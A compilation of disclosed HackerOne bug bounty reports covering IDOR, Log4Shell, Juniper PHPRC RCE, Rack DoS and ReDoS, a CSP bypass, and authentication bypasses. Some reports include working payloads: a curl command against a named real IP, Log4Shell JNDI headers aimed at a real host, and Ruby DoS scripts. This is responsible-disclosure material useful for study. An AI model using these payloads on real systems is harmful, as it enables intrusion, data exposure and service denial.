The HackerOne team promptly addressed the issue, recognizing its critical severity, and awarded a generous bounty for its discovery.

---

### [IDOR in backup recovery functionality](https://hackerone.com/reports/1901713)

- **Report ID:** `1901713`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Acronis
- **Reporter:** @theelgo64
- **Bounty:** - usd
- **Disclosed:** 2024-11-13T13:51:35.445Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
Hi team I hope you are well, there is an issue let me to takeover any backup via recover it to my machine.

## Steps To Reproduce
1. Login https://mc-beta-cloud.acronis.com
2. Visit the DEVICES section [you must have 2 devices]
3. Click on any device has a backup [device_1]
4. Click on recovery > select machine > select the second machine [device_2]
5. follow the steps to recover the backup to [device_2]
6. In the burp search for this endpoint ```/bc/api/ams/recovery/plan_operations/run```
7. Send the request again via ==X-Apigw-Session== session from another organization.


## POC

{F2222128}

## Impact

- Backup Takeover via recovery function.

**Summary (team):**

IDOR in backup recovery functionality allowed an authenticated attacker knowing user's machine UUID, backup ID and some other parameters to configure and run recovery plan. 

We have seen no signs of the exploitation of this vulnerability.

**Summary (researcher):**

Access Control Flaw Leading to Critical Data Deletion through Backup Overwrite Exploit
{F3758159}

---

### [Remote code execution [CVE-2023-36845]](https://hackerone.com/reports/2182202)

- **Report ID:** `2182202`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** MTN Group
- **Reporter:** @m4lc0lmx
- **Bounty:** - usd
- **Disclosed:** 2024-10-09T14:19:47.701Z
- **CVE(s):** CVE-2023-36845

**Vulnerability Information:**

### CVE-2023-36845

A PHP External Variable Modification vulnerability in J-Web of Juniper Networks Junos OS on EX Series and SRX Series allows an unauthenticated, network-based attacker to control certain, important environments variables. Utilizing a crafted request an attacker is able to modify a certain PHP environment variable leading to partial loss of integrity, 

## POC :

with curl 
41.205.30.222 = host-41.205.30.222.mtn.cm
```
curl -sk "https://41.205.30.222/?PHPRC=/dev/fd/0" -X POST -d 'auto_prepend_file="/etc/passwd"'

```

{F2727487}

## Impact

CVE-2023-36845 that allows an unauthenticated and remote attacker to execute arbitrary code on Juniper firewalls without creating a file on the system.

---

### [Possible DoS Vulnerability with Range Header in Rack](https://hackerone.com/reports/2520679)

- **Report ID:** `2520679`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Internet Bug Bounty
- **Reporter:** @ooooooo_q
- **Bounty:** 5420 usd
- **Disclosed:** 2024-09-25T00:02:39.730Z
- **CVE(s):** CVE-2024-26141

**Vulnerability Information:**

I made a report and patch at https://hackerone.com/reports/2307813.

https://discuss.rubyonrails.org/t/possible-dos-vulnerability-with-range-header-in-rack/84944

> There is a possible DoS vulnerability relating to the Range request header in Rack. This vulnerability has been assigned the CVE identifier CVE-2024-26141.
> Versions Affected: >= 1.3.0. Not affected: < 1.3.0 Fixed Versions: 3.0.9.1, 2.2.8.1

## Impact

> Carefully crafted Range headers can cause a server to respond with an unexpectedly large response. Responding with such large responses could lead to a denial of service issue.

> Vulnerable applications will use the Rack::File middleware or the Rack::Utils.byte_ranges methods (this includes Rails applications).

**Summary (team):**

Possible DoS Vulnerability with Range Header in Rack

There is a possible DoS vulnerability relating to the Range request header in Rack. This vulnerability has been assigned the CVE identifier CVE-2024-26141.

Versions Affected: >= 1.3.0. Not affected: < 1.3.0 Fixed Versions: 3.0.9.1, 2.2.8.1

Impact
Carefully crafted Range headers can cause a server to respond with an unexpectedly large response. Responding with such large responses could lead to a denial of service issue.

Vulnerable applications will use the Rack::File middleware or the Rack::Utils.byte_ranges methods (this includes Rails applications).

Credits
Thank you ooooooo_q for the report and patch

Full Security Advisory: https://discuss.rubyonrails.org/t/possible-dos-vulnerability-with-range-header-in-rack/84944

---

### [Privilege Escalation to Root SSH Access via Pre-Receive Hook Environment in GitHub Enterprise Server](https://hackerone.com/reports/2336236)

- **Report ID:** `2336236`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** GitHub
- **Reporter:** @inspector-ambitious
- **Bounty:** - usd
- **Disclosed:** 2024-09-13T17:43:57.011Z
- **CVE(s):** CVE-2024-2469

**Summary (team):**

An attacker with an Administrator role in GitHub Enterprise Server could gain SSH root access via remote code execution. This vulnerability affected GitHub Enterprise Server version 3.8.0 and above and was fixed in version 3.8.17, 3.9.12, 3.10.9, 3.11.7 and 3.12.1. This vulnerability was reported via the GitHub Bug Bounty program.

---

### [[CVE-2021-44228] Arbitrary Code Execution on ng01-cloud.acronis.com](https://hackerone.com/reports/1459714)

- **Report ID:** `1459714`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Acronis
- **Reporter:** @mikkocarreon
- **Bounty:** - usd
- **Disclosed:** 2024-08-28T09:03:58.673Z
- **CVE(s):** CVE-2021-44228

**Vulnerability Information:**

### Description
The application is using a vulnerable version of Log4j which allows arbitrary remote command execution. The vulnerability is also known as Log4Shell and is assigned [CVE-2021-44228](https://www.randori.com/blog/cve-2021-44228/).

### Reproduction Steps
For easier reproduction, please use Burp Collaborator and issue the following curl command with your collaborator instance URL;
```bash
curl --http1.1 --silent --output /dev/null \
--header 'User-agent: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
--header 'X-Forwarded-For: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
--header 'Referer: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
https://ng01-cloud.acronis.com
```
You should receive a request to your Collaborator Client with your server's hostname as the prefix. That should suffice to prove that the host is vulnerable. The hostname I received was `ng01-cloud-elk-ls-vm01`.

Note that it may take some time to receive the pingbacks. In case Burp Collaborator doesn't work, I'd advise using your own. Some alternatives are;
1. dig.pm
2. app.interactsh.com
3. dnslog.cn
4. pingb.in
5. requestbin.net
6. canarytokens.com

### Reference
https://www.lunasec.io/docs/blog/log4j-zero-day/

## Impact

Arbitrary remote code execution

---

### [important: Apache HTTP Server: SSRF with mod_rewrite in server/vhost context on Windows (CVE-2024-40898)](https://hackerone.com/reports/2612028)

- **Report ID:** `2612028`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Internet Bug Bounty
- **Reporter:** @xi4o7unj1e
- **Bounty:** 4263 usd
- **Disclosed:** 2024-08-27T06:47:10.713Z
- **CVE(s):** CVE-2024-40898

**Vulnerability Information:**

I reported this vulnerability through the official Apache HTTP Server security email on 2024-07-12, and received a CVE number on 2024-07-17. You can check detailed information from here:
https://httpd.apache.org/security/vulnerabilities_24.html

## Impact

SSRF in Apache HTTP Server on Windows with mod_rewrite in server/vhost context, allows to potentially leak NTLM hashes to a malicious server via SSRF and malicious requests.

**Summary (team):**

important: Apache HTTP Server: SSRF with mod_rewrite in server/vhost context on Windows (CVE-2024-40898)
SSRF in Apache HTTP Server on Windows with mod_rewrite in server/vhost context, allows to potentially leak NTLM hashes to a malicious server via SSRF and malicious requests.

Users are recommended to upgrade to version 2.4.62 which fixes this issue.

Acknowledgements:

finder: Smi1e (DBAPPSecurity Ltd.)
finder: xiaojunjie (DBAPPSecurity Ltd.)

Security Advisory: https://httpd.apache.org/security/vulnerabilities_24.html

---

### [CVE-2024-42005: Potential SQL injection in QuerySet.values() and values_list()](https://hackerone.com/reports/2646493)

- **Report ID:** `2646493`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Internet Bug Bounty
- **Reporter:** @eyalsec
- **Bounty:** 4263 usd
- **Disclosed:** 2024-08-24T17:48:29.349Z
- **CVE(s):** CVE-2024-42005

**Vulnerability Information:**

Hi IBB :)

I found SQL injection in django.
you can see my cve (CVE-2024-42005) here:
https://www.djangoproject.com/weblog/2024/aug/06/security-releases/

## Impact

QuerySet.values() and values_list() methods on models with a JSONField are subject to SQL injection in column aliases via a crafted JSON object key as a passed *arg.

NVD rated the vulnerability sevirity as 9.8.
https://nvd.nist.gov/vuln/detail/CVE-2024-42005

**Summary (team):**

###CVE-2024-42005: Potential SQL injection in QuerySet.values() and values_list()

QuerySet.values() and values_list() methods on models with a JSONField are subject to SQL injection in column aliases via a crafted JSON object key as a passed *arg.

Thanks to Eyal Gabay of EyalSec for the report.

This issue has severity "high" according to the Django security policy.

---

### [FULL ACCOUNT TAKEOVER](https://hackerone.com/reports/2542372)

- **Report ID:** `2542372`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** MTN Group
- **Reporter:** @impozzible
- **Bounty:** - usd
- **Disclosed:** 2024-08-17T11:51:52.714Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Using the selfservice portal @ https://mymtn.com.ng/ an attacker can easily takeover any nigerian mtn phone number, and get access to some information, like date of birth, full name, etc. The attacker can also make use of any airtime found on the account.

## Steps To Reproduce:
I have made a detailed video showing the process.

## Impact

Full Access to the Account
Access to some private information, like date of birth, nin, etc
Access to use up all credits and airtime on the account,
Access to modify the data on the account

---

### [Subdomain takeover in GitLab Pages [george.ratelimited.me]](https://hackerone.com/reports/2523677)

- **Report ID:** `2523677`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** RATELIMITED
- **Reporter:** @fdeleite
- **Bounty:** - usd
- **Disclosed:** 2024-08-11T18:04:13.985Z
- **CVE(s):** -

**Vulnerability Information:**

It's possible to take over subdomains that point to GitLab Pages. While adding a subdomain no verification of domain ownership is required.

## POC Steps 

1. Go to http://george.ratelimited.me/ (tested in Firefox)


{F3307364}

## Impact

Attackers could perform several attacks like:

  -  Cookie Stealing
  - Phishing campaigns.
  -  Bypass Content-Security Policies and CORS.

---

### [Content-Security Policy bypass with File Uploads](https://hackerone.com/reports/1380157)

- **Report ID:** `1380157`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Rocket.Chat
- **Reporter:** @gronke
- **Bounty:** - usd
- **Disclosed:** 2024-08-10T21:56:59.721Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

The current default CSP header in Rocket.Chat prevents inline script execution, which can be bypassed by importing a script file uploaded via the Rocket.Chat file upload.

## Description

The default CSP header blocks execution of inline-scripts. When a HTML injection vulnerability occurs though, that restriction can be bypassed by uploading a JavaScript file via the file-upload feature (with `application/javascript` or `text/javascript` content-type) to include it in a `<script src="<UPLOAD_URL></script>" tag.

It is worth noticing that script tags are removed from message content, but this filter can also be bypassed as following:

```html
<iframe srcdoc="&#x3c;script src='/file-upload/<UPLOAD ID>/payload.js?download'></script>">
```

## Releases Affected:

  * 4.0.3
  * 3.18.2

## Steps To Reproduce (from initial installation to vulnerability):

  1. Upload payload as `payload.js` via File Upload feature
  2. Inject iframe with srcdoc via arbitary XSS

## Suggested mitigation

  * Block script content-types from file-uploads
  * Filter frames from message body

## Impact

The CSP `unsafe-inline` restriction can be bypassed by uploading script payload as File Upload.

---

### [DoS with crafted "Range" header](https://hackerone.com/reports/2307813)

- **Report ID:** `2307813`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Ruby on Rails
- **Reporter:** @ooooooo_q
- **Bounty:** - usd
- **Disclosed:** 2024-06-25T09:29:59.053Z
- **CVE(s):** -

**Vulnerability Information:**

I have crafted a request header for "range" against proxy url in Active Storage and confirmed that it will be a DoS.

https://github.com/rails/rails/blob/v7.1.2/activestorage/app/controllers/active_storage/blobs/proxy_controller.rb#L14

```ruby
  def show
    if request.headers["Range"].present?
      send_blob_byte_range_data @blob, request.headers["Range"]
```      

https://github.com/rails/rails/blob/v7.1.2/activestorage/app/controllers/concerns/active_storage/streaming.rb#L14

```ruby
    def send_blob_byte_range_data(blob, range_header, disposition: nil)
      ranges = Rack::Utils.get_byte_ranges(range_header, blob.byte_size)
```

The `Range` object returned by [Rack::Utils.get_byte_ranges](https://github.com/rack/rack/blob/v3.0.8/lib/rack/utils.rb#L435) will never exceed the file size, but there is no restriction on overlapping ranges.

```ruby
❯ bundle exec rails c
Loading development environment (Rails 7.1.2)
irb(main):001> Rack::Utils.get_byte_ranges("bytes=20-40", 200)
=> [20..40]
irb(main):002> Rack::Utils.get_byte_ranges("bytes=20-200,0-200,0-200,-200,-200,", 200)
=> [20..199, 0..199, 0..199, 0..199, 0..199]
```

## PoC

```
❯ ruby -v
ruby 3.2.2 (2023-03-30 revision e51014f9c0) [arm64-darwin22]

❯ rails new range_dos -G -M -C -A -J -T 
=>  Rails 7.1.2, Rack 3.0.8

❯ cd range_dos

❯ bin/rails active_storage:install

❯ bin/rails generate model User avatar:attachment 

❯ bin/rails db:migrate   
```

`config/routes.rb`

```ruby
Rails.application.routes.draw do
  resources :users
  get "up" => "rails/health#show", as: :rails_health_check
end
```

`app/controllers/users_controller.rb`

```ruby
class UsersController < ApplicationController

  def new
    @user = User.new
  end

  def create
    user = User.create!(user_params)
    redirect_to "/users/#{user.id}"
  end

  def show
    @user = User.find(params[:id])
  end

  private
    def user_params
      params.require(:user).permit(:avatar)
    end
end
```

`app/views/users/new.html.erb`

```html
<%= form_with model: @user, local: true, :url => {:action => :create}  do |form| %>
  <%= form.file_field :avatar %><br>
  <%= form.submit %>
<% end %>
```

`app/views/users/show.html.erb`

```html
<% if @user.avatar.attached? %>
  <%= image_tag rails_storage_proxy_path(@user.avatar) %>
<% end %>
```

start server

```
# Comment out `config.force_ssl = true` in production.rb
❯ RAILS_ENV=production bundle exec rails s
```

After uploading the file on the `http://0.0.0.0:3000/users/new` screen, copy the proxy url that appears on the screen.
Sends the request using a crafted header for the url.

`range_request.rb`

```ruby
require 'net/http'

# set proxy url
url = URI.parse('http://0.0.0.0:3000/rails/active_storage/blobs/proxy/...')

req = Net::HTTP::Get.new(url.path)

# length = 8000 # Bad request

length = (80 * 1024 - "bytes=".bytesize) /  "-999999999,".bytesize
puts length 

req["Range"] = "bytes=" + "-999999999," * length 

res = Net::HTTP.start(url.host, url.port) {|http|
  http.request(req)
}

puts res.message
puts res.body.bytesize
```

```
❯ ruby range_request.rb
7446
Partial Content
410058706
```

If the target file is about 50 KB, each request will increase memory usage by several hundred MB.
If the file is nearly 1 MB, more than 10 GB of memory was used on the server side.

## Impact

When accessing the url of proxy, it is possible to put a load on the server's memory usage, etc., by repeatedly writing values in the `Range` request header. Even if the attacker stops the request midway through, the server continues to prepare data, making the attack more efficient.

The same problem exists with [Rack::Files](https://github.com/rack/rack/blob/main/lib/rack/files.rb#L85), but the problem is more serious with Active Stroage, which deals with files uploaded by users.

Additionally, when using nginx, the header length is limited to 8KB, which reduces the impact of the attack. 80KB is set in unicorn and puma.

---

### [CVE-2024-27281: RCE vulnerability with .rdoc_options in RDoc](https://hackerone.com/reports/2438265)

- **Report ID:** `2438265`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Internet Bug Bounty
- **Reporter:** @ooooooo_q
- **Bounty:** 4860 usd
- **Disclosed:** 2024-03-29T23:47:42.016Z
- **CVE(s):** CVE-2024-27281

**Vulnerability Information:**

I made a report at https://hackerone.com/reports/1187477

https://www.ruby-lang.org/en/news/2024/03/21/rce-rdoc-cve-2024-27281/

> An issue was discovered in RDoc 6.3.3 through 6.6.2, as distributed in Ruby 3.x through 3.3.0.
> When parsing .rdoc_options (used for configuration in RDoc) as a YAML file, object injection and resultant remote code execution are possible because there are no restrictions on the classes that can be restored.
> When loading the documentation cache, object injection and resultant remote code execution are also possible if there were a crafted cache.

## Impact

RCE is possible when the `rdoc` command is executed for a repository received from the external.

**Summary (team):**

RDoc RCE vulnerability with .rdoc_options

Description
An issue was discovered in RDoc 6.3.3 through 6.6.2, as distributed in Ruby 3.x through 3.3.0.

When parsing .rdoc_options (used for configuration in RDoc) as a YAML file, object injection and resultant remote code execution are possible because there are no restrictions on the classes that can be restored.

When loading the documentation cache, object injection and resultant remote code execution are also possible if there were a crafted cache.

We recommend to update the RDoc gem to version 6.6.3.1 or later. In order to ensure compatibility with bundled version in older Ruby series, you may update as follows instead:

For Ruby 3.0 users: Update to rdoc 6.3.4.1
For Ruby 3.1 users: Update to rdoc 6.4.1.1
For Ruby 3.2 users: Update to rdoc 6.5.1.1
You can use gem update rdoc to update it. If you are using bundler, please add gem "rdoc", ">= 6.6.3.1" to your Gemfile.

Note: 6.3.4, 6.4.1, 6.5.1 and 6.6.3 have a incorrect fix. We recommend to upgrade 6.3.4.1, 6.4.1.1, 6.5.1.1 and 6.6.3.1 instead of them.

Full GHSA: https://github.com/advisories/GHSA-592j-995h-p23j

---

### [CVE-2022-21371:  Oracle WebLogic Server Local File Inclusion](https://hackerone.com/reports/2387600)

- **Report ID:** `2387600`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Mars
- **Reporter:** @deb0con
- **Bounty:** - usd
- **Disclosed:** 2024-03-04T19:22:52.124Z
- **CVE(s):** CVE-2022-21371

**Summary (team):**

A vulnerability was identified in Oracle WebLogic Server, specifically in its Web Container component. The affected versions include ██████████, ██████████, ██████████, and ██████████ This vulnerability can be exploited by an unauthenticated attacker over HTTP, potentially leading to unauthorized access to critical data or complete control over Oracle WebLogic Server. The issue involves local file inclusion, which enables attackers to access sensitive data or the entire data store of the server.

---

### [Authentication bypass in Global Site Selector allows an attacker to log in as any user](https://hackerone.com/reports/2248689)

- **Report ID:** `2248689`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Nextcloud
- **Reporter:** @ryotak
- **Bounty:** - usd
- **Disclosed:** 2024-01-18T13:20:03.811Z
- **CVE(s):** CVE-2024-22212

**Summary (team):**

Security advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-vj5q-f63m-wp77

---

### [Authentication bypass on JetPack SSO manager - Allows to access the administration panel of wordpress without user interaction](https://hackerone.com/reports/2037902)

- **Report ID:** `2037902`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Automattic
- **Reporter:** @hundredpercent
- **Bounty:** - usd
- **Disclosed:** 2023-12-28T07:44:04.545Z
- **CVE(s):** -

**Vulnerability Information:**

Hello team,

## Summary:
The JetPack SSO manager is plugin that allows any user to log into their wordpress using the same log-in credentials you use for WordPress.com, then they’ll now be able to register for and sign in to self-hosted WordPress.org sites quickly, example :

User creates their wordpress instance at host.com, they install and enable  JetPack SSO
They later can login into their wordpress instance at host.com using wordpress.com, users are also can make other users register/login with the same company email (@host.com) and access the administration panel of the host


## Description :
The user anyways when he tries to authenticate into his wordpress instance via wordpress.com he gotta have his email confirmed, otherwise it won't work, interstingly there is a way that bypasses the email confirmation when a user invites you to his account and you accept his invite your account will be confirmed, chaining those issues the following scenario can result for the authentication bypass of any wordpress  instance when these circumestances are met :

* wordpress installed on host.com have jetpack installed and "Match accounts using email addresses" enabled (IDK if this is necessary anyways) 
* wordpress instance have a user with specific email, that email does not exist on wordpress.com

You can access this host.com wordpress panel via

## Steps To Reproduce:
**Setup**

  1. Install Jetpack latest version, once installed go to plugins>Jetpack>settings>"Match accounts using email addresses">enable (I'm not sure if this is intended or not)
  2. Add user into your wordpress (host.com) with their email (says something@company.com)


* **As attacker (email confirmation bypass)** :
  1. Create two accounts at Wordpress.com 
        A/. One with your personal email and confirm it 
        B/.  Second with the victim's existed user at host.com email (something@company.com)

  2. At your confirmed wordpress.com account go to settings >users invite your second account (something@company.com)
  3. At your second account go to notifications at the top right, see the invitation and accept it 
  4. See that your Wordpress.com account’s email has been verified (email confirmation bypass )

* **access the wordpress admin panel**
  1. Now at the same browser where the (something@company.com) Wordpress.com account 
  2. go to host.com wordpress panel 
  3. Click on sign in with wordpress.com
  4. Forward 
  5. See yourself logged in as admin on host.com wordpress

## Platform(s) Affected:
JetPack latest version




## Supporting Material/References:
As example I bypass ███████ 

██████

## Impact

* Bypass authentication of websites that runs wordpress with JetPack plugin without any user inteaction


Regards,

Adam

**Summary (team):**

The main issue in this report was that someone could invite an arbitrary email to a site, and then also verify that email address.

If someone was using that email on a Jetpack site, SSO and "Match accounts using email addresses" was enabled, the attacker could gain access to that site where account with that arbitrary email existed.

---

### [Unrestricted Access to Celery Flower Instance](https://hackerone.com/reports/2264960)

- **Report ID:** `2264960`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** EXNESS
- **Reporter:** @ashwarya
- **Bounty:** - usd
- **Disclosed:** 2023-12-14T15:12:14.139Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Team,

The Celery Flower instance is running and publicly accessible via the PIM mobile route /pim/flower/*. The access to this service is presently unrestricted. 

I quickly took a glance at the API to ensure that access is unrestricted. From this quick look, it appears possible to shut down a worker instance, revoke or terminate tasks, and perform other actions. In addition to unrestricted access to tasks and workers, I observed ███ via `/api/tasks` endpoint. Most importantly, the endpoint `/api/task/async-apply/*` seems to apply a task asynchronously, and there seems to be a possibility to execute arbitrary code on the Celery worker through this endpoint. I believe it's unwise for me to go beyond this since the instance is running in the prod environment, so I'm sending this quick report to you. If some form of escalation is needed for impact assessment, please let me know.

##Vulnerable Endpoint
```
https://api.excalls.mobi/pim/flower/
```

#Steps to Reproduce

```
https://api.excalls.mobi/pim/flower/api/workers
https://api.excalls.mobi/pim/flower/api/tasks
https://api.excalls.mobi/pim/flower/api/task/info/dc58fcb7-be31-4f4e-aeff-5837f0c32d30
```



#Proof of Concept
█████

████

██████


#Suggested Mitigation

Set the `flower_unauthenticated_api` environment variable to `false`

## Impact

The impact includes, but is not limited to:

1. Manipulating tasks to achieve unintended outcomes, such as disrupting or halting PIM processes.
2. ███
3. A malicious actor could continuously monitor and revoke tasks as they are created, preventing their execution and consuming resources. This could exhaust the Celery worker's resources and hinder its ability to handle legitimate tasks.
4. There seems to be a possibility to execute arbitrary code on the Celery worker by executing a task asynchronously.

**Summary (team):**

The publicly accessible Celery Flower instance allowed unrestricted access, exposing sensitive information, and the ability to manipulate tasks.

---

### [Yet Another CASB Integration Takeover of Active Integrations](https://hackerone.com/reports/2094346)

- **Report ID:** `2094346`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Cloudflare Public Bug Bounty
- **Reporter:** @matured_kazama
- **Bounty:** - usd
- **Disclosed:** 2023-11-13T10:36:10.177Z
- **CVE(s):** -

**Summary (team):**

Cloudflare CASB on the Microsoft integration, was vulnerable to the confused deputy problem. This was previously reported in another HackerOne report (#1952124) however a bypass was found which consisted of manipulating the casing of Microsoft’s tenant UUID. If an attacker, via a brute force attack or another mechanism, was able to enumerate a valid Microsoft tenant UUID that an existing Cloudflare CASB customer had integrated with, then the attacker would have been able to create a new integration which could surface sensitive information. Cloudflare's CASB engineering team rapidly implemented a fix to disallow the ability to create multiple integrations pointing to the same tenant, thus nullifying the attack as an option.

---

### [ Cargo not respecting umask when extracting crate archives](https://hackerone.com/reports/2094785)

- **Report ID:** `2094785`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Internet Bug Bounty
- **Reporter:** @addisoncrump
- **Bounty:** 4660 usd
- **Disclosed:** 2023-08-15T18:15:38.372Z
- **CVE(s):** CVE-2023-38497

**Vulnerability Information:**

Cargo did not properly protect files in the cargo registry. When an archive contained files which were marked as globally writeable, they would be unpacked as-is and retain their global writeability. This is CWE-278 (not available in HackerOne).

This was discovered as part of a (personal) routine file permissions check:

```sh
find / ! -type l -perm -002 -exec ls -alhd {} \;
```

## Impact

A local attacker may inject arbitrary code into the cached files present in the cargo registry. This, in turn, allows for a local attacker to act as the targeted user (when the user compiles the modified code) or to poison prebuilt binaries built by that user and thus have arbitrary code execution against downstream users (supply chain attack).

**Summary (team):**

Cargo not respecting umask when extracting crate archives

Description
The Rust Security Response WG was notified that Cargo did not respect the umask when extracting crate archives on UNIX-like systems. If the user downloaded a crate containing files writeable by any local user, another local user could exploit this to change the source code compiled and executed by the current user.

This vulnerability has been assigned CVE-2023-38497.

Overview
In UNIX-like systems, each file has three sets of permissions: for the user owning the file, for the group owning the file, and for all other local users. The "umask" is configured on most systems to limit those permissions during file creation, removing dangerous ones. For example, the default umask on macOS and most Linux distributions only allow the user owning a file to write to it, preventing the group owning it or other local users from doing the same.

When a dependency is downloaded by Cargo, its source code has to be extracted on disk to allow the Rust compiler to read as part of the build. To improve performance, this extraction only happens the first time a dependency is used, caching the pre-extracted files for future invocations.

Unfortunately, it was discovered that Cargo did not respect the umask during extraction, and propagated the permissions stored in the crate archive as-is. If an archive contained files writeable by any user on the system (and the system configuration didn't prevent writes through other security measures), another local user on the system could replace or tweak the source code of a dependency, potentially achieving code execution the next time the project is compiled.

Acknowledgments
We want to thank Addison Crump for responsibly disclosing this to us according to the Rust security policy.

Full GHSA link: https://github.com/rust-lang/cargo/security/advisories/GHSA-j3xp-wfr4-hx87

---

### [Steam Deck Single Click Root Remote Code Execution ](https://hackerone.com/reports/1974296)

- **Report ID:** `1974296`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Valve
- **Reporter:** @g1a55er
- **Bounty:** 750 usd
- **Disclosed:** 2023-08-01T21:33:13.863Z
- **CVE(s):** -

**Summary (team):**

The version of Chromium Embedded Framework included in the Linux client was susceptible to a v8 exploit that allowed modification of local files. The researcher demonstrated chaining local file modification to a local privilege escalation.

**Summary (researcher):**

The Steam Deck on latest software is vulnerable to a Remote Code Execution (RCE) vulnerability which can be chained with a privilege escalation vulnerability to provide an attacker full arbitrary root execution access after a user clicks on a link to maliciously crafted webpage in a Steam Chat message. The entire exploit chain can run deterministically after that single click with no further user interaction.  

Specifically, the Chromium Embedded Framework (CEF) used in the steamwebhelper is based on Chromium version 85.0.4183.121. This version is vulnerable to CVE-2020-16040. If the steamwebhelper loads a malicious page, this CVE can be exploited to obtain an RCE in the steamwebhelper process. 

The steamwebhelper process runs as the user “deck” with the CEF sandbox disabled. This means that immediately after exploitation, the attacker has access to all of the user’s files, because all user content is readable by “deck”. Likely most critically, this includes the Steam Sentry credential file stored at ~/.local/share/Steam/ssfn* that will be present on all Steam Decks and facilitates Steam account takeovers.

From here, we can pivot to obtaining full root access. By default, the deck user has sudoers privileges and no password set. Thus, all we need to do is set a password and then provide that password to the “sudo” binary for a full root shell.

However, the steamwebhelper executes with the “no new privileges” flag set, which prevents us from directly calling `sudo` from the initial RCE context. This can be easily circumvented by modifying some executable file that the deck user has access to that another process will eventually execute outside of the steamwebhelper process. Given the substantial file access privileges of the deck user (e.g. access to all games, the entire Steam executable, other apps, etc.), there are a variety of options to choose from for this. I verified that at least one such vulnerable site exists to facilitate this privilege escalation by planting a malicious payload in `~/.bashrc`, which seems to be executed at least whenever the device reboots. All these steps could be achieved in the shellcode executed from the Chrome RCE. 

Once you have achieved persistent root access, you can access all files and peripherals on the device.

---

### [ReDoS in Rack::Multipart](https://hackerone.com/reports/1489141)

- **Report ID:** `1489141`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Ruby on Rails
- **Reporter:** @ooooooo_q
- **Bounty:** - usd
- **Disclosed:** 2023-07-28T00:26:27.997Z
- **CVE(s):** CVE-2022-30122

**Vulnerability Information:**

Hello, I found ReDoS on Rack.

I found this problem using `recheck` (https://makenowjust-labs.github.io/recheck/), a ReDoS detection tool.

This tool has found multiple places where there seems to be a problem with the rack code, but since there are many and it takes time to check the behavior, I will first report on `Rack::Multipart::RFC2183`, which is the most dangerous.
This is detected as exponential by recheck.

- https://github.com/rack/rack/blob/2.2.3/lib/rack/multipart.rb#L38
- https://github.com/rack/rack/blob/2.2.3/lib/rack/multipart/parser.rb#L296

```ruby
❯ bundle exec irb
irb(main):001:0> require 'rack'
=> true
irb(main):002:0> Rack::Multipart::RFC2183
=> /^(?i-mx:Content-Disposition:\s*(?-mix:[^\s()<>,;:\\"\/\[\]?=]+)\s*)((?-mix:;\s*(?:(?-mix:((?-mix:(?-mix:(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%])+)(?-mix:\*[0-9]+)?))=((?-mix:"(?:\\"|[^"])*"|(?-mix:[^\s()<>,;:\\"\/\[\]?=]+))))|(?-mix:(?-mix:((?-mix:(?-mix:(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%])+)(?:\*0)?\*))=((?-mix:[a-zA-Z0-9\-]*'[a-zA-Z0-9\-]*'(?-mix:%[0-9a-fA-F]{2}|(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%]))*)))|(?-mix:((?-mix:(?-mix:(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%])+)\*[1-9][0-9]*\*))=((?-mix:%[0-9a-fA-F]{2}|(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%]))*))))\s*))+$/i
```


### benchmark

rfc2183_benchmark.rb

```ruby
require 'benchmark'
require 'rack'

regexp = Rack::Multipart::RFC2183

def attack_text(length)
 "Content-Disposition:G;\f=\""  + "=;1=\";\fD=\";t*1*" * length + '='
end

Benchmark.bm do |x|
  x.report { attack_text(5)[regexp] }
  x.report { attack_text(10)[regexp] }
  x.report { attack_text(15)[regexp] }
  x.report { attack_text(20)[regexp] }
  x.report { attack_text(25)[regexp] }
  x.report { attack_text(26)[regexp] }
end
```

```
❯ bundle exec ruby rfc2183_benchmark.rb
       user     system      total        real
   0.000018   0.000004   0.000022 (  0.000016)
   0.000357   0.000000   0.000357 (  0.000361)
   0.010888   0.000018   0.010906 (  0.010961)
   0.342814   0.000717   0.343531 (  0.344750)
  10.925193   0.022059  10.947252 ( 10.979092)
  21.906178   0.049380  21.955558 ( 22.024203)
```


### PoC

Gemfile

```ruby
# frozen_string_literal: true

source "https://rubygems.org"

gem 'rack', '~> 2.2', '>= 2.2.3'
gem 'puma', '~> 5.6', '>= 5.6.2'
```

config.ru

```ruby
class Server
  def call(env)
    Rack::Request.new(env).params

    [ 200, {}, []]
  end
end

run Server.new
```

```ruby
require "net/http"
require "uri"

class Net::HTTPGenericRequest

  def encode_multipart_form_data(out, params, opt)
    charset = opt[:charset]
    boundary = opt[:boundary]
    buf = ''
    params.each do |key, value|
      buf << "--#{boundary}\r\n"
      buf << "Content-Disposition:G;\f=\""  + "=;1=\";\fD=\";t*1*" * 27 + '='
      buf << "Content-Type: application/octet-stream\r\n\r\n"

      buf << "content"
